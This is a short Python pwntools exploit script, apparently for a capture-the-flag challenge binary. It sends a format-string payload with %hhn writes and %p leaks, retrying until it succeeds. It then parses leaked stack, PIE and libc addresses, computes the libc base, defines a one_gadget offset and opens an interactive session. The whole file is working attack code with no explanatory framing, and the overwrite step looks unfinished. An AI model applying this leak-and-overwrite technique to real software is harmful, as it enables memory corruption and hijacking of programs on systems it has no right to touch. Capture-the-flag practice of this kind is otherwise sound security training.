from pwn import *
from time import sleep

payload = b'%c%c%c%c%c;%p;%p;AAAA%hhn%cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn%c%c;%p'

libc = ELF('./libc.so.6')

while True:
    io = process('./chal')
    try:
        io.sendline(payload)
        a = io.recv()
        io.recv(timeout=2)
        break
    except:
        io.close()


one_gadget = 0xe3b01

#io.sendline(b'AAAAAAAAA')
b = a.split(b';')
stack = int(b[1], 16)
print(hex(stack))
pie = int(b[2], 16)
print(hex(pie))
libc.address = int(b[4], 16) - 0x24083
print(hex(libc.address))
gdb.attach(io)
pause()
io.sendline(b'%13$p')
print(io.recv())
io.interactive()
